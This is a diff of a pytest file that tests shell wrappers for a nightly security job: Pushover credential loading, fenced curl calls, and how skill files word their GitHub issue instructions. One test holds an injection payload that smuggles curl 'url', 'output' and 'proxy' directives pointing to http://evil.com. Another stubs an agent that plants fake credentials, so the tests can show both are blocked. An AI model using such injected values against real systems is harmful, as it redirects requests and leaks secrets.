@@ -62,7 +62,7 @@ def _format_issue_body_fn(wrapper: Path) -> str:
 def _notify_cred_fn(wrapper: Path) -> str:
     body = _uncommented(wrapper)
     start = body.index("_notify_cred() {")
-    end = body.index("\n_notify_curl() {", start)
+    end = body.index("\nGH_BIN=", start)
     return body[start:end]
 
 
@@ -356,11 +356,19 @@ class TestWrappersAndSkillsUseTheTemplate:
         assert "gh issue edit" in lowered
         assert "you do not author" in lowered or "cannot author" in lowered
 
-    def test_other_skills_may_keep_agent_owned_issue_write_ups(self):
-        testing = (
-            REPO / ".claude" / "skills" / "testing-weekend" / "SKILL.md"
-        ).read_text(encoding="utf-8")
-        assert "do not run `gh issue comment`" not in testing.lower()
+    def test_other_skills_post_issue_comment_only(self):
+        non_security = [
+            skill for skill in SKILLS if skill.parent.name != "security-nightly"
+        ]
+        for skill in non_security:
+            text = skill.read_text(encoding="utf-8")
+            lowered = text.lower()
+            assert "`gh issue comment`" in text, skill
+            assert "do not run `gh issue create` or `gh issue edit`" in lowered, skill
+            assert "do not patch the issue" in lowered, skill
+            assert "not the only commenter" in lowered, skill
+            assert "wrapper posts the only public" not in lowered, skill
+            assert "do not run `gh issue comment`" not in lowered, skill
 
     def test_pr_title_body_generation_is_untouched_in_skills(self):
         # #229 owns PR title/body via github_pr_output.py. Issue comments are
@@ -465,14 +473,26 @@ class TestNotifyPhaseIsFenced:
         guard_i = body.index(
             '[[ "${1:-}" == "--lock-lib-only" ]] && return 0 2>/dev/null'
         )
+        user_i = body.index(
+            'NOTIFY_PUSHOVER_USER="$(_notify_cred PUSHOVER_USER || true)"'
+        )
+        token_i = body.index(
+            'NOTIFY_PUSHOVER_TOKEN="$(_notify_cred PUSHOVER_TOKEN || true)"'
+        )
         assert timeout_i < guard_i, wrapper.name
         assert timeout_i < path_i, wrapper.name
         assert gh_i < path_i, wrapper.name
+        assert user_i < path_i, wrapper.name
+        assert token_i < path_i, wrapper.name
         assert 'net_bounded "$GH_BIN"' in body, wrapper.name
         assert "net_bounded gh " not in body, wrapper.name
         assert '"$TIMEOUT_BIN"' in body, wrapper.name
         assert '"$TIMEOUT_BIN" -k' in body, wrapper.name
         assert "timeout -k" not in body, wrapper.name
+        curl = _notify_curl_fn(wrapper)
+        assert "_notify_cred" not in curl, wrapper.name
+        assert "$NOTIFY_PUSHOVER_USER" in curl, wrapper.name
+        assert "$NOTIFY_PUSHOVER_TOKEN" in curl, wrapper.name
 
     @pytest.mark.parametrize("wrapper", WRAPPERS, ids=lambda p: p.name)
     def test_notify_cred_strips_cr_not_a_quoted_newline(self, wrapper: Path):
@@ -483,7 +503,7 @@ class TestNotifyPhaseIsFenced:
     def test_notify_cred_reads_a_crlf_env_file(self, tmp_path: Path):
         src = (REPO / "scripts" / "security_nightly.sh").read_text(encoding="utf-8")
         start = src.index("_notify_cred() {")
-        end = src.index("\n_notify_curl() {", start)
+        end = src.index("\nGH_BIN=", start)
         envf = tmp_path / ".env"
         envf.write_bytes(b"PUSHOVER_TOKEN=tok-from-crlf\r\nPUSHOVER_USER=user-from-crlf\r\n")
         script = tmp_path / "run.sh"
@@ -508,7 +528,7 @@ class TestNotifyPhaseIsFenced:
         self, wrapper: Path, tmp_path: Path
     ):
         src = wrapper.read_text(encoding="utf-8")
-        start = src.index("_notify_cred() {")
+        start = src.index("_notify_curl() {")
         end = src.index("\nnotify_phase() {", start)
         curl_log = tmp_path / "curl.log"
         curl_stub = tmp_path / "curl"
@@ -516,14 +536,9 @@ class TestNotifyPhaseIsFenced:
         curl_stub.chmod(curl_stub.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
         fns = src[start:end].replace("/usr/bin/curl", str(curl_stub))
         payload = 'foo"\nurl = "http://evil.com"\noutput = "/tmp/pwn"\nproxy = "http://evil.com"'
-        (tmp_path / ".env").write_text(
-            f"PUSHOVER_USER=test-user\nPUSHOVER_TOKEN={payload}\n",
-            encoding="utf-8",
-        )
         script = tmp_path / "run.sh"
         script.write_text(
             "#!/usr/bin/env bash\nset -euo pipefail\n"
-            f'WEEKEND_ROOT="{tmp_path}"\n'
             + fns
             + '\n_notify_curl testloop audit OK "" ""\n',
             encoding="utf-8",
@@ -532,8 +547,8 @@ class TestNotifyPhaseIsFenced:
             ["/bin/bash", str(script)],
             env={
                 **os.environ,
-                "PUSHOVER_USER": "test-user",
-                "PUSHOVER_TOKEN": payload,
+                "NOTIFY_PUSHOVER_USER": "test-user",
+                "NOTIFY_PUSHOVER_TOKEN": payload,
             },
             capture_output=True,
             text=True,
@@ -617,6 +632,10 @@ class TestNotifyPhaseIsFenced:
             "curl": _curl_log_stub(curl_log),
             "claude": (
                 "#!/bin/sh\n"
+                f"cat > '{tmp_path / '.env'}' <<'EOF'\n"
+                "PUSHOVER_USER=pwned-user\n"
+                "PUSHOVER_TOKEN=pwned-token\n"
+                "EOF\n"
                 "echo 'SECURITY-NIGHTLY PHASE COMPLETE: audit'\n"
                 "exit 0\n"
             ),
@@ -648,6 +667,9 @@ class TestNotifyPhaseIsFenced:
         assert argv_line.split()[0] == "-q", argv_line
         assert "api.pushover.net" in curl_calls, curl_calls
         assert "title=radon security audit" in curl_calls, curl_calls
+        assert "test-token" in curl_calls, curl_calls
+        assert "pwned-token" not in curl_calls, curl_calls
+        assert "pwned-user" not in curl_calls, curl_calls
         assert "test-token" not in argv_line, argv_line
         assert "token=" not in argv_line, argv_line
         assert "user=" not in argv_line, argv_line
